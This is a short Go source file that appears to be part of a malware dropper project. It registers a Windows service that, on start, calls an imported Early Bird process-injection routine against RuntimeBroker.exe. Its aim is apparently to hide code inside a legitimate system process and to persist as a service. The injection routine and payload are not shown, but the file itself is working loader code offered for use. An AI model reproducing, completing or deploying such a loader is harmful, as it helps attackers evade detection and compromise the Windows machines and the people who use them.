package main

import (
	earlybird "GoDroplets/utils/EarlyBird"
	"fmt"
	"log"
	"time"

	"golang.org/x/sys/windows/svc"
)

type myService struct{}

func (m *myService) Execute(args []string, req <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {
    status <- svc.Status{State: svc.StartPending}
    
    earlybird.RunEarlyBird("C:\\Windows\\System32\\RuntimeBroker.exe")

    status <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
    log.Println("Service started")

    loop:
    for {
        select {
        case c := <-req:
            switch c.Cmd {
            case svc.Stop, svc.Shutdown:
                log.Println("Service stopping...")
                break loop
            }
        case <-time.After(2 * time.Second):
            log.Println("Service is running...")
        }
    }

    status <- svc.Status{State: svc.StopPending}
    log.Println("Service stopped")
    return false, 0
}

func isWindowsService() (bool, error) {
    isService, err := svc.IsWindowsService()
    if err != nil {
        return false, err
    }
    return isService, nil
}

func main() {
    isService, err := isWindowsService()
    if err != nil {
        log.Fatalf("Failed to determine if running as service: %v", err)
    }

    if isService {
        err = svc.Run("MyServiceName", &myService{})
        if err != nil {
            log.Fatalf("Failed to start service: %v", err)
        }
    } else {
        fmt.Println("Running as console application. Press Ctrl+C to exit.")
        m := &myService{}
        go m.Execute(nil, make(chan svc.ChangeRequest), make(chan svc.Status))
        
        select {}
    }
}

